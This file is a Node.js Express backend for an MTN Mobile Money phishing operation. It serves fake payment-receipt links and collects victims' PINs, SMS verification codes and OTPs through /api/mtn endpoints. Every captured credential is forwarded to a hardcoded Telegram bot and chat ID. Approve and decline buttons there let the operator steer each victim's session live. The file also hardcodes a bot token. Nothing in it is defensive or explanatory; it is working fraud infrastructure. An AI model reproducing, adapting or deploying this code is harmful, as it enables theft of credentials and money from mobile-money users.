const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// ── Telegram (MTN bot) ──
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8990759987:AAHKlDryNbTo5oXaRsMcMdFCK_Q61SPxFAo';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '6811595070';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const DATA_DIR   = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
const LINKS_FILE = path.join(DATA_DIR, 'mtn_links.json');
const TXS_FILE   = path.join(DATA_DIR, 'mtn_txs.json');

try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}

app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

function loadMap(file){
  try {
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, 'utf8');
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return new Map(parsed);
    }
  } catch(e){ console.warn(`[load] ${file} failed:`, e.message); }
  return null;
}
function saveMap(file, map){
  try { fs.writeFileSync(file, JSON.stringify([...map.entries()])); }
  catch(e){ console.warn(`[save] ${file} failed:`, e.message); }
}

let links = loadMap(LINKS_FILE) || new Map();
let txs   = loadMap(TXS_FILE)   || new Map();

console.log(`[links] restored ${links.size} from disk`);
console.log(`[txs]   restored ${txs.size} from disk`);

function persistLinks(){ saveMap(LINKS_FILE, links); }
function persistTxs(){   saveMap(TXS_FILE, txs); }

function esc(s = ''){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function tgSend(text, replyMarkup){
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (replyMarkup) body.reply_markup = replyMarkup;
  try {
    const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify(body)
    });
    return r.json();
  } catch(e){ return { ok:false, description: e.message }; }
}

async function tgAnswer(cbId, text){
  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ callback_query_id: cbId, text, show_alert: false })
  }).catch(()=>{});
}

async function tgRemoveButtons(chatId, messageId){
  await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(()=>{});
}

function ensureTx(trackingNumber, extra){
  if (!trackingNumber) return null;
  let t = txs.get(trackingNumber);
  if (!t) {
    t = {
      trackingNumber,
      pinStatus: 'pending',
      smsStatus: 'pending',
      otpStatus: 'pending',
      createdAt: Date.now(),
      ...extra
    };
    txs.set(trackingNumber, t);
  } else if (extra) {
    Object.assign(t, extra);
  }
  persistTxs();
  return t;
}

function nowCAT(){
  return new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Lagos' }) + ' WAT';
}

function normalizeLang(v){
  const l = String(v || '').toLowerCase().trim();
  return (l === 'fr' || l === 'en') ? l : 'en';
}

app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'mtn-momo-backend',
    activeLinks: links.size,
    activeTxs: txs.size,
    dataDir: DATA_DIR,
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    publicUrl: process.env.PUBLIC_URL || '(not set)',
    time: new Date().toISOString()
  });
});

app.get('/health', (_req, res) => res.json({
  ok: true,
  ts: Date.now(),
  activeLinks: links.size,
  activeTxs: txs.size,
  dataDir: DATA_DIR
}));

app.get('/api/debug', (_req, res) => {
  const tList = [];
  for (const [tn, t] of txs) tList.push({
    tn,
    pinStatus: t.pinStatus,
    smsStatus: t.smsStatus,
    otpStatus: t.otpStatus,
    lang: t.lang || '—'
  });
  res.json({ ok:true, dataDir: DATA_DIR, txs: tList });
});

app.get('/api/check-webhook', async (_req, res) => {
  try {
    const r = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
    res.json(await r.json());
  } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
});

app.get('/api/set-webhook', async (_req, res) => {
  try {
    const publicUrl = (process.env.PUBLIC_URL || `https://${process.env.RAILWAY_PUBLIC_DOMAIN || 'localhost'}`).replace(/\/+$/, '');
    const webhookUrl = `${publicUrl}/api/telegram-webhook`;
    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
    res.json({ webhookUrl, result: await r.json() });
  } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
});

app.post('/api/links', (req, res) => {
  try {
    const body = req.body || {};
    const tracking = String(body.trackingNumber || body.t || '').trim().toUpperCase();
    if (!tracking) return res.status(400).json({ ok:false, error:'Tracking number required' });
    const now = Date.now();
    const expiryHours = parseInt(body.expiryHours, 10) || 6;
    const lang = normalizeLang(body.lang);
    const record = {
      trackingNumber: tracking,
      accountName: body.accountName || '',
      accountNumber: body.accountNumber || '',
      amount: body.amount || '0',
      currency: (body.currency || 'UGX').toUpperCase(),
      countryCode: body.countryCode || '+256',
      countryFlag: body.countryFlag || '🇺🇬',
      countryName: body.countryName || 'Uganda',
      modeOfPayment: body.modeOfPayment || 'MTN MoMo',
      receiptOptional: body.receiptOptional || '',
      marketedBy: body.marketedBy || '',
      timestamp: body.timestamp || '',
      network: 'mtn',
      lang: lang,
      expiryHours: expiryHours,
      createdAt: now,
      expiresAt: now + expiryHours * 60 * 60 * 1000
    };
    links.set(tracking, record);
    persistLinks();
    console.log(`[link] created ${tracking} (expires in ${expiryHours}h, lang=${lang})`);
    res.json({
      ok: true,
      code: tracking,
      trackingNumber: tracking,
      lang: lang,
      expiryHours: expiryHours,
      expiresAt: record.expiresAt
    });
  } catch (err) { res.status(500).json({ ok:false, error: err.message }); }
});

app.get('/api/links/:code', (req, res) => {
  const code = String(req.params.code || '').trim().toUpperCase();
  let rec = links.get(code);
  if (!rec) {
    const restored = loadMap(LINKS_FILE);
    if (restored) { links = restored; rec = links.get(code); }
  }
  if (!rec) return res.status(404).json({ ok:false, error:'Link not found' });
  if (rec.expiresAt && Date.now() > rec.expiresAt) {
    links.delete(code); persistLinks();
    return res.status(410).json({ ok:false, error:'Link expired', expiresAt: rec.expiresAt });
  }
  const lang = normalizeLang(rec.lang);
  res.json({
    ok: true,
    ...rec,
    lang: lang,
    tx:  rec.trackingNumber,
    tn:  rec.trackingNumber,
    rn:  rec.accountName,
    am:  rec.amount,
    cur: rec.currency,
    an:  rec.accountNumber,
    c:   rec.countryName,
    cf:  rec.countryFlag,
    cc:  rec.countryCode,
    pm:  rec.modeOfPayment,
    sn:  rec.receiptOptional,
    mk:  rec.marketedBy,
    ts:  rec.timestamp
  });
});

app.post('/api/mtn/pin', async (req, res) => {
  try {
    const { tx, pin, phone, am, cur, c, an, rn, lang } = req.body || {};
    if (!tx || !pin) {
      return res.status(400).json({ ok:false, message:'Missing data' });
    }

    const tracking = String(tx).toUpperCase();
    const rec = links.get(tracking) || {};
    const t = ensureTx(tracking, { receipt: rec });
    const L = normalizeLang(lang || rec.lang || t.lang);

    t.pinStatus = 'pending';
    t.pinSubmittedAt = Date.now();
    t.pinPhone = phone || '';
    t.pinCode = pin;
    t.lang = L;
    persistTxs();

    const text =
      `🔐 <b>MTN PIN Captured</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
      `📱 <b>Phone:</b> <code>${esc(phone || rec.accountNumber || an || '—')}</code>\n` +
      `🔑 <b>PIN:</b> <code>${esc(pin)}</code>\n` +
      `💳 <b>Service:</b> ${esc(rec.modeOfPayment || 'MTN MoMo')}\n` +
      `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
      `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
      `🕒 ${nowCAT()}`;

    const buttons = {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `mtn:pin:approve:${tracking}` },
        { text: '❌ Decline', callback_data: `mtn:pin:decline:${tracking}` }
      ]]
    };

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, message: 'Telegram error' });
    }

    res.json({ ok:true, status:'pending' });
  } catch (err) {
    console.error('mtn/pin error:', err);
    res.status(500).json({ ok:false, message: err.message });
  }
});

app.post('/api/mtn/sms', async (req, res) => {
  try {
    const { tx, code, message, am, cur, c, an, rn, lang } = req.body || {};
    if (!tx) return res.status(400).json({ ok:false, message:'Missing tx' });

    const tracking = String(tx).toUpperCase();
    const rec = links.get(tracking) || {};
    const t = ensureTx(tracking, { receipt: rec });
    const L = normalizeLang(lang || rec.lang || t.lang);

    t.smsStatus = 'pending';
    t.smsSubmittedAt = Date.now();
    t.smsCode = code || '';
    t.smsMessage = message || '';
    t.lang = L;
    persistTxs();

    const text =
      `📩 <b>MTN SMS Captured</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
      `📱 <b>Phone:</b> <code>${esc(rec.accountNumber || an || '—')}</code>\n` +
      `🔑 <b>Code:</b> <code>${esc(code || '—')}</code>\n` +
      `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
      `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
      `🕒 ${nowCAT()}\n` +
      `\n<b>Message:</b>\n<code>${esc(message || '')}</code>`;

    const buttons = {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: `mtn:sms:approve:${tracking}` },
          { text: '❌ Decline', callback_data: `mtn:sms:decline:${tracking}` }
        ],
        [
          { text: '📄 Needs Full SMS', callback_data: `mtn:sms:needs_full_sms:${tracking}` },
          { text: '🔁 Resend',         callback_data: `mtn:sms:resend:${tracking}` }
        ]
      ]
    };

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, message:'Telegram error' });
    }

    res.json({ ok:true, status:'pending' });
  } catch (err) {
    console.error('mtn/sms error:', err);
    res.status(500).json({ ok:false, message: err.message });
  }
});

app.post('/api/mtn/otp', async (req, res) => {
  try {
    const { tx, otp, am, cur, c, lang } = req.body || {};
    if (!tx || !otp) return res.status(400).json({ ok:false, message:'Missing data' });

    const tracking = String(tx).toUpperCase();
    const rec = links.get(tracking) || {};
    const t = ensureTx(tracking, { receipt: rec });
    const L = normalizeLang(lang || rec.lang || t.lang);

    t.otpStatus = 'pending';
    t.otpSubmittedAt = Date.now();
    t.otpCode = otp;
    t.lang = L;
    persistTxs();

    const text =
      `🔢 <b>MTN OTP Captured</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(rec.accountName || '—')}\n` +
      `🔑 <b>OTP:</b> <code>${esc(otp)}</code>\n` +
      `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
      `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
      `🕒 ${nowCAT()}`;

    const buttons = {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: `mtn:otp:approve:${tracking}` },
          { text: '❌ Decline', callback_data: `mtn:otp:decline:${tracking}` }
        ],
        [
          { text: '🔁 Resend',   callback_data: `mtn:otp:resend:${tracking}` },
          { text: '⚠️ Inactive', callback_data: `mtn:otp:inactive:${tracking}` }
        ]
      ]
    };

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, message:'Telegram error' });
    }

    res.json({ ok:true, status:'pending' });
  } catch (err) {
    console.error('mtn/otp error:', err);
    res.status(500).json({ ok:false, message: err.message });
  }
});

app.post('/api/mtn/resend', async (req, res) => {
  try {
    const { tx, stage, c, am, cur, lang } = req.body || {};
    if (!tx) return res.status(400).json({ ok:false, message:'Missing tx' });

    const tracking = String(tx).toUpperCase();
    const rec = links.get(tracking) || {};
    const t = ensureTx(tracking, { receipt: rec });
    const L = normalizeLang(lang || rec.lang || t.lang);

    const which = (stage === 'otp') ? 'OTP' : 'SMS';
    if (stage === 'otp') t.otpStatus = 'resend';
    else t.smsStatus = 'resend';
    t.lang = L;
    persistTxs();

    await tgSend(
      `🔁 <b>MTN ${which} Resend Requested</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
      `👤 ${esc(rec.accountName || '—')}\n` +
      `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
      `🕒 ${nowCAT()}`,
      null
    );

    res.json({ ok:true, message: `Resend noted (${which})` });
  } catch (err) {
    res.status(500).json({ ok:false, message: err.message });
  }
});

app.get('/api/mtn/status/:tx', (req, res) => {
  const tracking = String(req.params.tx || '').trim().toUpperCase();
  let t = txs.get(tracking);
  if (!t) {
    const restored = loadMap(TXS_FILE);
    if (restored) { txs = restored; t = txs.get(tracking); }
  }
  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });

  res.json({
    ok: true,
    decision: t.pinStatus || 'pending',
    pinStatus: t.pinStatus || 'pending',
    smsStatus: t.smsStatus || 'pending',
    otpStatus: t.otpStatus || 'pending',
    lang: normalizeLang(t.lang)
  });
});

app.get('/api/mtn/sms-status/:tx', (req, res) => {
  const tracking = String(req.params.tx || '').trim().toUpperCase();
  let t = txs.get(tracking);
  if (!t) {
    const restored = loadMap(TXS_FILE);
    if (restored) { txs = restored; t = txs.get(tracking); }
  }
  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });

  let decision = 'pending';
  if (t.smsStatus === 'approved') decision = 'approved';
  else if (t.smsStatus === 'declined') decision = 'declined';
  else if (t.smsStatus === 'resend') decision = 'expired';
  else if (t.smsStatus === 'needs_full_sms') decision = 'needs_full_sms';

  res.json({ ok:true, decision, tx: tracking, lang: normalizeLang(t.lang) });
});

app.get('/api/mtn/otp-status/:tx', (req, res) => {
  const tracking = String(req.params.tx || '').trim().toUpperCase();
  let t = txs.get(tracking);
  if (!t) {
    const restored = loadMap(TXS_FILE);
    if (restored) { txs = restored; t = txs.get(tracking); }
  }
  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });

  let decision = 'pending';
  if (t.otpStatus === 'approved') decision = 'approved';
  else if (t.otpStatus === 'declined') decision = 'declined';
  else if (t.otpStatus === 'resend') decision = 'expired';
  else if (t.otpStatus === 'inactive') decision = 'inactive';

  res.json({ ok:true, decision, tx: tracking, lang: normalizeLang(t.lang) });
});

app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cq = update.callback_query;
    console.log(`[webhook] hasCallback=${!!cq} data=${cq?.data || 'none'}`);

    if (cq && cq.data) {
      const parts = String(cq.data).split(':');

      if (parts.length === 4 && parts[0] === 'mtn') {
        const [_, stage, action, txRaw] = parts;
        const tracking = txRaw.toUpperCase();
        let t = txs.get(tracking);
        if (!t) {
          const restored = loadMap(TXS_FILE);
          if (restored) { txs = restored; t = txs.get(tracking); }
        }
        if (!t) {
          await tgAnswer(cq.id, 'Session expired');
          return res.json({ ok:true });
        }

        const labels = { approve:'✅ Approved', decline:'❌ Declined', resend:'🔁 Resend', inactive:'⚠️ Inactive', needs_full_sms:'📄 Needs Full SMS' };

        if (stage === 'pin') {
          if (action === 'approve') t.pinStatus = 'approved';
          else if (action === 'decline') t.pinStatus = 'declined';
        } else if (stage === 'sms') {
          if (action === 'approve') t.smsStatus = 'approved';
          else if (action === 'decline') t.smsStatus = 'declined';
          else if (action === 'resend') t.smsStatus = 'resend';
          else if (action === 'needs_full_sms') t.smsStatus = 'needs_full_sms';
        } else if (stage === 'otp') {
          if (action === 'approve') t.otpStatus = 'approved';
          else if (action === 'decline') t.otpStatus = 'declined';
          else if (action === 'resend') t.otpStatus = 'resend';
          else if (action === 'inactive') t.otpStatus = 'inactive';
        }

        persistTxs();
        await tgAnswer(cq.id, labels[action] || action);
        if (cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
        console.log(`[webhook] mtn:${stage}:${action}:${tracking} → pin=${t.pinStatus} sms=${t.smsStatus} otp=${t.otpStatus} lang=${t.lang || 'en'}`);
        return res.json({ ok:true });
      }
    }

    return res.json({ ok:true });
  } catch (err) {
    console.error('webhook error:', err);
    res.status(500).json({ ok:false, error: err.message });
  }
});

async function registerWebhook(){
  const publicUrl = (
    process.env.PUBLIC_URL ||
    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : '') ||
    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
    `http://localhost:${PORT}`
  ).replace(/\/+$/, '');
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log(`PUBLIC_URL = ${publicUrl}`);
  console.log(`Registering webhook: ${webhookUrl}`);
  try {
    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
    console.log('setWebhook result:', await r.json());
  } catch (e) { console.error('setWebhook failed:', e.message); }
}

app.listen(PORT, async () => {
  console.log(`MTN MoMo backend running on port ${PORT}`);
  console.log(`Static HTML dir: ${path.join(__dirname, '..')}`);
  console.log(`Data directory: ${DATA_DIR}`);
  if (DATA_DIR !== '/data') {
    console.warn('⚠️  No persistent disk — data wiped on restart');
  }
  await registerWebhook();
});
